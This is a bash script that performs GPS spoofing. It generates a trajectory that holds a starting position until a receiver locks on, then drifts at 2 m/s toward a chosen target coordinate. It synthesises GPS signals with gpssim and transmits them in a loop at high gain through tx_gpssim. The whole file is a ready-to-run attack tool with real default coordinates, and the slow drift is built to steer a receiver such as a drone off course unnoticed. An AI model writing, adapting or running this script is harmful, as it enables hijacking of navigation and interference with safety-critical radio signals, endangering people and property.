#!/usr/bin/env bash
# spoof_drift.sh — GPS spoofing: acquire fix then drift at 2 m/s to target
#
# Usage:
#   ./spoof_drift.sh [start_lat] [start_lon] [start_alt] \
#                   [target_lat] [target_lon] [target_alt] [gain_dB]
#
# Example:
#   ./spoof_drift.sh 17.604012 78.126885 100  17.500000 78.200000 100  75

set -e
DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

START_LAT="${1:-17.604012}"
START_LON="${2:-78.126885}"
START_ALT="${3:-100}"
TGT_LAT="${4:-17.500000}"
TGT_LON="${5:-78.200000}"
TGT_ALT="${6:-100}"
GAIN="${7:-75}"
SPEED=2.0
HOLD=90        # seconds of static position before drift (give receiver time to get 3D fix)
DURATION=300   # total IQ duration per file (loops = continuous drift)
SAMPLE_RATE=2600000
RINEX="brdc1500.26n"
TRAJ="trajectory_drift.csv"
IQ="gpssim_drift.bin"
GPSSIM_TIME="2026/05/30,03:30:00"

echo "============================================"
echo " GPS Spoofing — 3D Fix + 2 m/s Drift"
echo "============================================"
echo " Start  : ${START_LAT}N  ${START_LON}E  ${START_ALT}m"
echo " Target : ${TGT_LAT}N  ${TGT_LON}E  ${TGT_ALT}m"
echo " Speed  : ${SPEED} m/s   Hold: ${HOLD}s static before drift"
echo " Gain   : ${GAIN} dB"
echo ""

echo "[1/3] Generating trajectory (10 rows/s, space-separated)..."
python3 gen_trajectory.py \
    --start    "${START_LAT},${START_LON},${START_ALT}" \
    --target   "${TGT_LAT},${TGT_LON},${TGT_ALT}" \
    --speed    "${SPEED}" \
    --hold     "${HOLD}" \
    --duration "${DURATION}" \
    --out      "${TRAJ}"
echo ""

echo "[2/3] Generating IQ samples (takes ~30s)..."
./gpssim \
    -e "${RINEX}" \
    -x "${TRAJ}" \
    -t "${GPSSIM_TIME}" \
    -d "${DURATION}" \
    -s "${SAMPLE_RATE}" \
    -b 16 \
    -o "${IQ}"
echo ""
ls -lh "${IQ}"
echo ""

echo "[3/3] Transmitting (loops file — drift repeats every ${DURATION}s). Ctrl+C to stop."
./tx_gpssim -f "${IQ}" -g "${GAIN}" -s "${SAMPLE_RATE}"
